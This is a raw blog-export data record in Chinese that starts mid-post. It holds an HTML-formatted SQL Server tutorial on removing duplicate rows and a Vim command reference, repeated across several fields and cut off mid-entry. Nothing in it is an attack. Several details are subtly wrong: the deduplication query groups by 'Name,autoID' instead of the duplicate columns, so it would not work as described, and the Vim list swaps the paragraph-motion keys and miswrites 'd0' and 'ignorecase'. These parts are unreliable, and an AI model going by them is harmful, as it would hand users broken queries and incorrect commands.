src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div><br></div>"},{"title":"Vim 命令大全","id":"3","updated":"2016-08-05T20:14:15.000Z","date":"2016-07-28T09:16:13.000Z","_content":"<!-- more --> \n## \n**进入vi的命令**\n\nvi filename :打开或新建文件，并将光标置于第一行首\n\nvi +n filename ：打开文件，并将光标置于第n行首\n\nvi + filename ：打开文件，并将光标置于最后一行首\n\nvi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处\n\nvi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename\n\nvi filename....filename ：打开多个文件，依次进行编辑\n\n## 移动光标类命令\n\nh ：光标左移一个字符\n\nl ：光标右移一个字符\n\nspace：光标右移一个字符\n\nBackspace：光标左移一个字符\n\nk或Ctrl+p：光标上移一行\n\nj或Ctrl+n ：光标下移一行\n\nEnter ：光标下移一行\n\nw或W ：光标右移一个字至字首\n\nb或B ：光标左移一个字至字首\n\ne或E ：光标右移一个字至字尾\n\n) ：光标移至句尾\n\n( ：光标移至句首\n\n}：光标移至段落开头\n\n{：光标移至段落结尾\n\nnG：光标移至第n行首\n\nn+：光标下移n行\n\nn-：光标上移n行\n\nn$：光标移至第n行尾\n\nH ：光标移至屏幕顶行\n\nM ：光标移至屏幕中间行\n\nL ：光标移至屏幕最后行\n\n0：（注意是数字零）光标移至当前行首\n\n$：光标移至当前行尾\n\n## 屏幕翻滚类命令\n\nCtrl+u：向文件首翻半屏\n\nCtrl+d：向文件尾翻半屏\n\nCtrl+f：向文件尾翻一屏\n\nCtrl＋b；向文件首翻一屏\n\nnz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。\n\n## 插入文本类命令\n\ni ：在光标前\n\nI ：在当前行首\n\na：光标后\n\nA：在当前行尾\n\no：在当前行之下新开一行\n\nO：在当前行之上新开一行\n\nr：替换当前字符\n\nR：替换当前字符及其后的字符，直至按ESC键\n\ns：从当前光标位置处开始，以输入的文本替代指定数目的字符\n\nS：删除指定数目的行，并以所输入文本代替之\n\nncw或nCW：修改指定数目的字\n\nnCC：修改指定数目的行\n\n## 删除命令\n\nndw或ndW：删除光标处开始及其后的n-1个字\n\ndo：删至行首\n\nd$：删至行尾\n\nndd：删除当前行及其后n-1行\n\nx或X：删除一个字符，x删除光标后的，而X删除光标前的\n\nCtrl+u：删除输入方式下所输入的文本\n\n## 搜索及替换命令\n\n/pattern：从光标开始处向文件尾搜索pattern\n\n?pattern：从光标开始处向文件首搜索pattern\n\nn：在同一方向重复上一次搜索命令\n\nN：在反方向上重复上一次搜索命令\n\n：s/p1/p2/g：将当前行中所有p1均用p2替代\n\n：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代\n\n：g/p1/s//p2/g：将文件中所有p1均用p2替换\n\n## 选项设置\n\nall：列出所有选项设置情况\n\nterm：设置终端类型\n\nignorance：在搜索中忽略大小写\n\nlist：显示制表位(Ctrl+I)和行尾标志（$)\n\nnumber：显示行号\n\nreport：显示由面向行的命令修改过的数目\n\nterse：显示简短的警告信息\n\nwarn：在转到别的文件时若没保存当前文件则显示NO write信息\n\nnomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符\n\nnowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始\n\nmesg：允许vi显示其他用户用write写到自己终端上的信息\n\n## 最后行方式命令\n\n：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下\n\n：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下\n\n：n1,n2 d ：将n1行到n2行之间的内容删除\n\n：w ：保存当前文件\n\n：e filename：打开文件filename进行编辑\n\n：x：保存当前文件并退出\n\n：q：退出vi\n\n：q!：不保存文件并退出vi\n\n：!command：执行shell命令command\n\n：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入\n\n：r!command：将命令command的输出结果放到当前行\n\n## 寄存器操作\n\n\"?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字\n\nndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。","source":"_posts/Vim-命令大全.md","raw":"---\ntitle: Vim 命令大全\ntags: 'Linux'\npermalink: vimda-quan\nid: 3\nupdated: '2016-08-05 21:14:15'\ndate: 2016-07-28 10:16:13\n---\n<!-- more --> \n## \n**进入vi的命令**\n\nvi filename :打开或新建文件，并将光标置于第一行首\n\nvi +n filename ：打开文件，并将光标置于第n行首\n\nvi + filename ：打开文件，并将光标置于最后一行首\n\nvi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处\n\nvi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename\n\nvi filename....filename ：打开多个文件，依次进行编辑\n\n## 移动光标类命令\n\nh ：光标左移一个字符\n\nl ：光标右移一个字符\n\nspace：光标右移一个字符\n\nBackspace：光标左移一个字符\n\nk或Ctrl+p：光标上移一行\n\nj或Ctrl+n ：光标下移一行\n\nEnter ：光标下移一行\n\nw或W ：光标右移一个字至字首\n\nb或B ：光标左移一个字至字首\n\ne或E ：光标右移一个字至字尾\n\n) ：光标移至句尾\n\n( ：光标移至句首\n\n}：光标移至段落开头\n\n{：光标移至段落结尾\n\nnG：光标移至第n行首\n\nn+：光标下移n行\n\nn-：光标上移n行\n\nn$：光标移至第n行尾\n\nH ：光标移至屏幕顶行\n\nM ：光标移至屏幕中间行\n\nL ：光标移至屏幕最后行\n\n0：（注意是数字零）光标移至当前行首\n\n$：光标移至当前行尾\n\n## 屏幕翻滚类命令\n\nCtrl+u：向文件首翻半屏\n\nCtrl+d：向文件尾翻半屏\n\nCtrl+f：向文件尾翻一屏\n\nCtrl＋b；向文件首翻一屏\n\nnz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。\n\n## 插入文本类命令\n\ni ：在光标前\n\nI ：在当前行首\n\na：光标后\n\nA：在当前行尾\n\no：在当前行之下新开一行\n\nO：在当前行之上新开一行\n\nr：替换当前字符\n\nR：替换当前字符及其后的字符，直至按ESC键\n\ns：从当前光标位置处开始，以输入的文本替代指定数目的字符\n\nS：删除指定数目的行，并以所输入文本代替之\n\nncw或nCW：修改指定数目的字\n\nnCC：修改指定数目的行\n\n## 删除命令\n\nndw或ndW：删除光标处开始及其后的n-1个字\n\ndo：删至行首\n\nd$：删至行尾\n\nndd：删除当前行及其后n-1行\n\nx或X：删除一个字符，x删除光标后的，而X删除光标前的\n\nCtrl+u：删除输入方式下所输入的文本\n\n## 搜索及替换命令\n\n/pattern：从光标开始处向文件尾搜索pattern\n\n?pattern：从光标开始处向文件首搜索pattern\n\nn：在同一方向重复上一次搜索命令\n\nN：在反方向上重复上一次搜索命令\n\n：s/p1/p2/g：将当前行中所有p1均用p2替代\n\n：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代\n\n：g/p1/s//p2/g：将文件中所有p1均用p2替换\n\n## 选项设置\n\nall：列出所有选项设置情况\n\nterm：设置终端类型\n\nignorance：在搜索中忽略大小写\n\nlist：显示制表位(Ctrl+I)和行尾标志（$)\n\nnumber：显示行号\n\nreport：显示由面向行的命令修改过的数目\n\nterse：显示简短的警告信息\n\nwarn：在转到别的文件时若没保存当前文件则显示NO write信息\n\nnomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符\n\nnowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始\n\nmesg：允许vi显示其他用户用write写到自己终端上的信息\n\n## 最后行方式命令\n\n：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下\n\n：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下\n\n：n1,n2 d ：将n1行到n2行之间的内容删除\n\n：w ：保存当前文件\n\n：e filename：打开文件filename进行编辑\n\n：x：保存当前文件并退出\n\n：q：退出vi\n\n：q!：不保存文件并退出vi\n\n：!command：执行shell命令command\n\n：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入\n\n：r!command：将命令command的输出结果放到当前行\n\n## 寄存器操作\n\n\"?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字\n\nndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。","slug":"vimda-quan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiska5000p3sonkitzo7uo","content":"<a id=\"more\"></a> \n<p>##<br><strong>进入vi的命令</strong></p>\n<p>vi filename :打开或新建文件，并将光标置于第一行首</p>\n<p>vi +n filename ：打开文件，并将光标置于第n行首</p>\n<p>vi + filename ：打开文件，并将光标置于最后一行首</p>\n<p>vi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处</p>\n<p>vi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename</p>\n<p>vi filename….filename ：打开多个文件，依次进行编辑</p>\n<h2 id=\"移动光标类命令\"><a href=\"#移动光标类命令\" class=\"headerlink\" title=\"移动光标类命令\"></a>移动光标类命令</h2><p>h ：光标左移一个字符</p>\n<p>l ：光标右移一个字符</p>\n<p>space：光标右移一个字符</p>\n<p>Backspace：光标左移一个字符</p>\n<p>k或Ctrl+p：光标上移一行</p>\n<p>j或Ctrl+n ：光标下移一行</p>\n<p>Enter ：光标下移一行</p>\n<p>w或W ：光标右移一个字至字首</p>\n<p>b或B ：光标左移一个字至字首</p>\n<p>e或E ：光标右移一个字至字尾</p>\n<p>) ：光标移至句尾</p>\n<p>( ：光标移至句首</p>\n<p>}：光标移至段落开头</p>\n<p>{：光标移至段落结尾</p>\n<p>nG：光标移至第n行首</p>\n<p>n+：光标下移n行</p>\n<p>n-：光标上移n行</p>\n<p>n$：光标移至第n行尾</p>\n<p>H ：光标移至屏幕顶行</p>\n<p>M ：光标移至屏幕中间行</p>\n<p>L ：光标移至屏幕最后行</p>\n<p>0：（注意是数字零）光标移至当前行首</p>\n<p>$：光标移至当前行尾</p>\n<h2 id=\"屏幕翻滚类命令\"><a href=\"#屏幕翻滚类命令\" class=\"headerlink\" title=\"屏幕翻滚类命令\"></a>屏幕翻滚类命令</h2><p>Ctrl+u：向文件首翻半屏</p>\n<p>Ctrl+d：向文件尾翻半屏</p>\n<p>Ctrl+f：向文件尾翻一屏</p>\n<p>Ctrl＋b；向文件首翻一屏</p>\n<p>nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。</p>\n<h2 id=\"插入文本类命令\"><a href=\"#插入文本类命令\" class=\"headerlink\" title=\"插入文本类命令\"></a>插入文本类命令</h2><p>i ：在光标前</p>\n<p>I ：在当前行首</p>\n<p>a：光标后</p>\n<p>A：在当前行尾</p>\n<p>o：在当前行之下新开一行</p>\n<p>O：在当前行之上新开一行</p>\n<p>r：替换当前字符</p>\n<p>R：替换当前字符及其后的字符，直至按ESC键</p>\n<p>s：从当前光标位置处开始，以输入的文本替代指定数目的字符</p>\n<p>S：删除指定数目的行，并以所输入文本代替之</p>\n<p>ncw或nCW：修改指定数目的字</p>\n<p>nCC：修改指定数目的行</p>\n<h2 id=\"删除命令\"><a href=\"#删除命令\" class=\"headerlink\" title=\"删除命令\"></a>删除命令</h2><p>ndw或ndW：删除光标处开始及其后的n-1个字</p>\n<p>do：删至行首</p>\n<p>d$：删至行尾</p>\n<p>ndd：删除当前行及其后n-1行</p>\n<p>x或X：删除一个字符，x删除光标后的，而X删除光标前的</p>\n<p>Ctrl+u：删除输入方式下所输入的文本</p>\n<h2 id=\"搜索及替换命令\"><a href=\"#搜索及替换命令\" class=\"headerlink\" title=\"搜索及替换命令\"></a>搜索及替换命令</h2><p>/pattern：从光标开始处向文件尾搜索pattern</p>\n<p>?pattern：从光标开始处向文件首搜索pattern</p>\n<p>n：在同一方向重复上一次搜索命令</p>\n<p>N：在反方向上重复上一次搜索命令</p>\n<p>：s/p1/p2/g：将当前行中所有p1均用p2替代</p>\n<p>：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代</p>\n<p>：g/p1/s//p2/g：将文件中所有p1均用p2替换</p>\n<h2 id=\"选项设置\"><a href=\"#选项设置\" class=\"headerlink\" title=\"选项设置\"></a>选项设置</h2><p>all：列出所有选项设置情况</p>\n<p>term：设置终端类型</p>\n<p>ignorance：在搜索中忽略大小写</p>\n<p>list：显示制表位(Ctrl+I)和行尾标志（$)</p>\n<p>number：显示行号</p>\n<p>report：显示由面向行的命令修改过的数目</p>\n<p>terse：显示简短的警告信息</p>\n<p>warn：在转到别的文件时若没保存当前文件则显示NO write信息</p>\n<p>nomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符</p>\n<p>nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始</p>\n<p>mesg：允许vi显示其他用户用write写到自己终端上的信息</p>\n<h2 id=\"最后行方式命令\"><a href=\"#最后行方式命令\" class=\"headerlink\" title=\"最后行方式命令\"></a>最后行方式命令</h2><p>：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下</p>\n<p>：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下</p>\n<p>：n1,n2 d ：将n1行到n2行之间的内容删除</p>\n<p>：w ：保存当前文件</p>\n<p>：e filename：打开文件filename进行编辑</p>\n<p>：x：保存当前文件并退出</p>\n<p>：q：退出vi</p>\n<p>：q!：不保存文件并退出vi</p>\n<p>：!command：执行shell命令command</p>\n<p>：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入</p>\n<p>：r!command：将命令command的输出结果放到当前行</p>\n<h2 id=\"寄存器操作\"><a href=\"#寄存器操作\" class=\"headerlink\" title=\"寄存器操作\"></a>寄存器操作</h2><p>“?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字</p>\n<p>“?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字</p>\n<p>ndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。</p>\n","excerpt":"","more":"<p>##<br><strong>进入vi的命令</strong></p>\n<p>vi filename :打开或新建文件，并将光标置于第一行首</p>\n<p>vi +n filename ：打开文件，并将光标置于第n行首</p>\n<p>vi + filename ：打开文件，并将光标置于最后一行首</p>\n<p>vi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处</p>\n<p>vi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename</p>\n<p>vi filename….filename ：打开多个文件，依次进行编辑</p>\n<h2 id=\"移动光标类命令\"><a href=\"#移动光标类命令\" class=\"headerlink\" title=\"移动光标类命令\"></a>移动光标类命令</h2><p>h ：光标左移一个字符</p>\n<p>l ：光标右移一个字符</p>\n<p>space：光标右移一个字符</p>\n<p>Backspace：光标左移一个字符</p>\n<p>k或Ctrl+p：光标上移一行</p>\n<p>j或Ctrl+n ：光标下移一行</p>\n<p>Enter ：光标下移一行</p>\n<p>w或W ：光标右移一个字至字首</p>\n<p>b或B ：光标左移一个字至字首</p>\n<p>e或E ：光标右移一个字至字尾</p>\n<p>) ：光标移至句尾</p>\n<p>( ：光标移至句首</p>\n<p>}：光标移至段落开头</p>\n<p>{：光标移至段落结尾</p>\n<p>nG：光标移至第n行首</p>\n<p>n+：光标下移n行</p>\n<p>n-：光标上移n行</p>\n<p>n$：光标移至第n行尾</p>\n<p>H ：光标移至屏幕顶行</p>\n<p>M ：光标移至屏幕中间行</p>\n<p>L ：光标移至屏幕最后行</p>\n<p>0：（注意是数字零）光标移至当前行首</p>\n<p>$：光标移至当前行尾</p>\n<h2 id=\"屏幕翻滚类命令\"><a href=\"#屏幕翻滚类命令\" class=\"headerlink\" title=\"屏幕翻滚类命令\"></a>屏幕翻滚类命令</h2><p>Ctrl+u：向文件首翻半屏</p>\n<p>Ctrl+d：向文件尾翻半屏</p>\n<p>Ctrl+f：向文件尾翻一屏</p>\n<p>Ctrl＋b；向文件首翻一屏</p>\n<p>nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。</p>\n<h2 id=\"插入文本类命令\"><a href=\"#插入文本类命令\" class=\"headerlink\" title=\"插入文本类命令\"></a>插入文本类命令</h2><p>i ：在光标前</p>\n<p>I 